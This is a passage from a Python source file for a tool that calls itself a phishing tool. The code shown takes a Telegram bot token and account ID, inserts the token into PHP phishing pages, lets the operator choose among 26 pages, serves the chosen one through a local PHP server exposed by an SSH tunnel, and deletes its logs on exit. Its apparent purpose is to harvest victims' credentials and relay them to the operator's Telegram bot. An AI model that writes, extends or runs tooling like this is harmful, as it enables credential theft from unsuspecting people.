        """Clean up resources and stop services"""
        self.print_color("\n[!] Stopping all services and cleaning up...", Colors.RED)
        self.stop_services()
        
        if self.current_token:
            self.revert_token()
        
        # Remove temporary files
        temp_files = ['current_tunnel.url', 'generated_url.txt', 'php_server.log', 'php_server.pid', 'ssh_tunnel.pid']
        for temp_file in temp_files:
            if Path(temp_file).exists():
                Path(temp_file).unlink()
        
        # Remove SSH tunnel logs
        for log_file in Path('.').glob('ssh_tunnel_*.log'):
            try:
                log_file.unlink()
            except:
                pass
        
        self.print_color("[+] Cleanup completed. Goodbye!", Colors.GREEN)

    def main(self):
        """Main program loop"""
        self.print_banner()
        
        # Check if we're in the right directory with PHP files
        php_files = list(Path('.').glob('*.php'))
        if not php_files:
            self.print_color("[-] No PHP files found in current directory!", Colors.RED)
            self.print_color("[!] Please make sure you're in the correct directory", Colors.YELLOW)
            self.print_color("[!] The tool requires PHP phishing pages in the current directory", Colors.YELLOW)
            sys.exit(1)
        
        # Check dependencies
        if not self.check_dependencies():
            self.print_color("[-] Failed to install required dependencies. Exiting.", Colors.RED)
            sys.exit(1)
        
        # Check for SSH key
        if not Path('id_rsa').exists():
            self.print_color("[!] SSH key (id_rsa) not found in current directory", Colors.YELLOW)
            self.print_color("[!] The script will use alternative authentication methods", Colors.YELLOW)
        
        # Main interaction loop
        while True:
            self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ BOT TOKEN SETUP ═════════════════════════{Colors.NC}")
            
            # Get bot token
            while True:
                bot_token = input(f"{Colors.YELLOW}[+] Enter Token BoT Telegram: {Colors.NC}").strip()
                if self.validate_token(bot_token):
                    self.print_color("[✓] Valid bot token format!", Colors.GREEN)
                    self.current_token = bot_token
                    break
                else:
                    self.print_color("[-] Invalid bot token format!", Colors.RED)
                    self.print_color(f"[!] Format: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789", Colors.YELLOW)
                    self.print_color(f"[!] Your token: {bot_token}", Colors.YELLOW)
                    self.print_color(f"[!] Length: {len(bot_token)} characters", Colors.YELLOW)
            
            # Get Telegram ID
            self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}════════════════════════ TELEGRAM ID SETUP ════════════════════════{Colors.NC}")
            while True:
                user_id = input(f"{Colors.YELLOW}[+] Enter ID Your Telegram account: {Colors.NC}").strip()
                if self.validate_id(user_id):
                    self.print_color("[✓] Valid Telegram ID!", Colors.GREEN)
                    self.user_id = user_id
                    break
                else:
                    self.print_color("[-] Invalid Telegram ID! Must be numeric and at least 5 digits", Colors.RED)
            
            # Replace token in PHP files
            self.search_and_replace_token(bot_token)
            
            # Page selection
            self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ PAGE SELECTION ══════════════════════════{Colors.NC}")
            self.show_pages_menu()
            
            while True:
                choice = input(f"{Colors.YELLOW}[+] Choose the page you want to create [0-26]: {Colors.NC}").strip()
                
                if choice == '0':
                    self.show_help()
                    self.print_banner()
                    self.show_pages_menu()
                    continue
                elif choice == '26':
                    self.print_color("[!] Exiting...", Colors.RED)
                    self.cleanup()
                    sys.exit(0)
                elif choice in self.pages:
                    self.selected_page = self.pages[choice]
                    break
                else:
                    self.print_color("[-] Invalid selection! Choose [0-26]", Colors.RED)
            
            # Check if page exists
            if not Path(self.selected_page).exists():
                self.print_color(f"[-] Page '{self.selected_page}' not found!", Colors.RED)
                self.print_color("[!] Available PHP files in current directory:", Colors.YELLOW)
                for php_file in php_files:
                    self.print_color(f"    - {php_file}", Colors.WHITE)
                continue
            
            self.print_color(f"[+] Selected page: {self.selected_page}", Colors.GREEN)
            
            # Stop any existing services
            self.stop_services()
            
            # Start PHP server
            if not self.start_php_server():
                continue
            
            # Start SSH tunnel
            if self.start_ssh_tunnel():
                if self.generate_url():
                    self.display_results()
                    self.wait_for_services()
            else:
                self.print_color("[-] Failed to start tunnel", Colors.RED)

def main():
    """Main entry point"""
    tool = PhishingTool()
    try:
        tool.main()
    except KeyboardInterrupt:
        tool.cleanup()
    except Exception as e:
        print(f"{Colors.RED}[-] Unexpected error: {str(e)}{Colors.NC}")
        tool.cleanup()

if __name__ == "__main__":
    main()
